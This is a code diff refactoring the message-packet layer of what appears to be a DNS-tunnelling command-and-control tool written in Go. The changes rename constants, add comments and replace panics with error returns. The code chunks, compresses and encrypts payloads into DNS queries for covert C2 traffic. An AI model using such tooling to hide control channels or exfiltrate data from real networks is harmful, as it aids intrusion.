@@ -16,8 +16,11 @@ import (
 )
 
 const (
-	PAYLOAD_SIZE         = int(70)
-	CHUNK_SIZE           = uint8(90)
+	// PayloadSize is the maximum number of bytes that can be fit inside a C2 Msg object. it will have the added headers before being sent on wire
+	PayloadSize = int(70)
+	// ChunkSize determines how much data each DNS query or response has. after converting the msg of ChunkSize to base32, it shouldn't exceed ~250 bytes
+	ChunkSize = uint8(90)
+	// CompressionThreshold sets the minimum msg size to be compressed. anything lower than this size will be sent uncompressed
 	CompressionThreshold = 1024 * 2 // 2KB
 )
 
@@ -54,11 +57,14 @@ const (
 // if ParentPartID != 0 -> incoming packets in the order of their PartID
 // if IsLastPart == true -> last packet
 
+// PartID is the ID of each part of a multipart message. ParentPartID is also of this type
+type PartID uint16
+
 // MessagePacket is the payload that will be on the wire for each DNS query and response
 type MessagePacket struct {
 	TimeStamp     uint32  `struc:"uint32,little"`
-	PartID        uint16  `struc:"uint16,little"`
-	ParentPartID  uint16  `struc:"uint16,little"`
+	PartID        PartID  `struc:"uint16,little"`
+	ParentPartID  PartID  `struc:"uint16,little"`
 	IsLastPart    bool    `struc:"bool,little"`
 	MessageType   MsgType `struc:"uint8,little"`
 	Command       CmdType `struc:"uint8,little"`
@@ -86,6 +92,7 @@ func (d *dedup) Add(keyBytes []byte) bool {
 	return true
 }
 
+// DedupHashTable is an empty map with the hash of the payload as key.
 var DedupHashTable dedup = make(map[uint64]struct{})
 
 // PerformExternalAQuery is a very basic A query provider. TODO: this needs to move to github.com/mosajjal/dnsclient
@@ -139,7 +146,7 @@ func split(buf []byte, lim int) [][]byte {
 
 // PreparePartitionedPayload Gets a big payload that needs to be sent over the wire, chops it up into smaller limbs and creates a list of messages to be sent. It also sends the parentPartID to make sure the series
 // of messages are not lost
-func PreparePartitionedPayload(msg MessagePacket, payload []byte, dnsSuffix string, privateKey *cryptography.PrivateKey, serverPublicKey *cryptography.PublicKey) ([]string, uint16, error) {
+func PreparePartitionedPayload(msg MessagePacket, payload []byte, dnsSuffix string, privateKey *cryptography.PrivateKey, serverPublicKey *cryptography.PublicKey) ([]string, PartID, error) {
 	// TODO: fix duplicate sending
 
 	// handle compression
@@ -147,27 +154,27 @@ func PreparePartitionedPayload(msg MessagePacket, payload []byte, dnsSuffix stri
 		var b bytes.Buffer
 		gz, _ := gzip.NewWriterLevel(&b, gzip.BestCompression)
 		if _, err := gz.Write(payload); err != nil {
-			panic(err)
+			return nil, 0, err
 		}
 		if err := gz.Flush(); err != nil {
-			panic(err)
+			return nil, 0, err
 		}
 		if err := gz.Close(); err != nil {
-			panic(err)
+			return nil, 0, err
 		}
 		payload = b.Bytes()
 	}
 
 	var err error
 	var response []string
-	var parentPartID uint16 = 0
+	var parentPartID PartID = 0
 	// retryCount := 1 //todo: retry of >1 could cause message duplicates
-	limbs := split(payload, int(CHUNK_SIZE))
+	limbs := split(payload, int(ChunkSize))
 	if len(limbs) > 1 {
 		msg.IsLastPart = false
 		msg.PartID = 0
 		rand.Seed(time.Now().UnixNano())
-		msg.ParentPartID = uint16(rand.Uint32()) + 1
+		msg.ParentPartID = PartID(uint16(rand.Uint32()) + 1)
 		parentPartID = msg.ParentPartID
 	}
 	//todo: maybe a cap on the number of limbs here, as well as some progress logging inside the loop?
@@ -203,7 +210,7 @@ func PreparePartitionedPayload(msg MessagePacket, payload []byte, dnsSuffix stri
 }
 
 // returns a list of subdomains from a dns message. if the msg type is answer, only answers are returned, otherwise only questions
-func getSubdomainsFromDnsMessage(m *dns.Msg) []string {
+func getSubdomainsFromDNSMessage(m *dns.Msg) []string {
 	var res []string
 	if len(m.Answer) > 0 {
 		// for _, a := range m.Answer {
@@ -222,7 +229,7 @@ func getSubdomainsFromDnsMessage(m *dns.Msg) []string {
 // DecryptIncomingPacket decrypts the incoming packet and returns the list of messages, a boolean indicating if the message should be skipped, and an error
 func DecryptIncomingPacket(m *dns.Msg, suffix string, privatekey *cryptography.PrivateKey, publickey *cryptography.PublicKey) ([]MessagePacketWithSignature, bool, error) {
 	out := []MessagePacketWithSignature{}
-	listOfSubdomains := getSubdomainsFromDnsMessage(m)
+	listOfSubdomains := getSubdomainsFromDNSMessage(m)
 	for _, sub := range listOfSubdomains {
 		if strings.HasSuffix(sub, suffix) {
 
